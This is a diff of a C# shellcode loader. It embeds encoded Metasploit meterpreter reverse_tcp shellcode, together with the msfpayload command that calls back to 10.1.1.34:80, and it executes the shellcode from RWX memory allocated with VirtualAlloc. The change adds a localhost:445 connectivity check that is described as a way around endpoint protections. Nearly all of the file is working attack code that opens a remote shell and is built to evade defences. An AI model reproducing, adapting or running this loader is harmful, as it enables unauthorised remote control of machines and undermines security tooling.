@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Net;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 
 namespace Wrapper
@@ -53,36 +55,67 @@ namespace Wrapper
 
         static void Main()
         {
-            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
-            string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";
-
-            byte[] sc = new byte[shellcode.Length];
-
-            for (int i = 0; i < shellcode.Length; i++)
+            // only run shellcode if you can connect to localhost:445, due to endpoint protections
+            if (ConnectToLocalhost(445))
             {
-                sc[i] = Convert.ToByte(shellcode[i]);
+                // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
+                string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";
+
+                byte[] sc = new byte[shellcode.Length];
+
+                for (int i = 0; i < shellcode.Length; i++)
+                {
+                    sc[i] = Convert.ToByte(shellcode[i]);
+                }
+
+                // Allocate RWX memory for the shellcode
+                IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
+                System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");
+
+                try
+                {
+                    // Copy shellcode to RWX buffer
+                    Marshal.Copy(sc, 0, baseAddr, sc.Length);
+
+                    // Get pointer to function created in memory
+                    ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
+
+                    del();
+                }
+                finally
+                {
+                    VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
+                }
             }
+            
+            Console.ReadLine();
+        }
 
-            // Allocate RWX memory for the shellcode
-            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
-            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");
+        private static bool ConnectToLocalhost(int port)
+        {
+            IPAddress localhost = IPAddress.Parse("127.0.0.1");
+            TcpClient tcpClient = new TcpClient();
 
+            bool isSuccess = false;
+            
             try
             {
-                // Copy shellcode to RWX buffer
-                Marshal.Copy(sc, 0, baseAddr, sc.Length);
-
-                // Get pointer to function created in memory
-                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
-
-                del();
+                tcpClient.Connect(localhost, port);
+                isSuccess = true;
+            }
+            catch
+            {
+                // I know this is bad code-fu, but just eat the error
             }
             finally
             {
-                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
+                if (tcpClient.Connected)
+                {
+                    tcpClient.Close();    
+                }
             }
 
-            Console.ReadLine();
+            return isSuccess;
         }
     }
 }
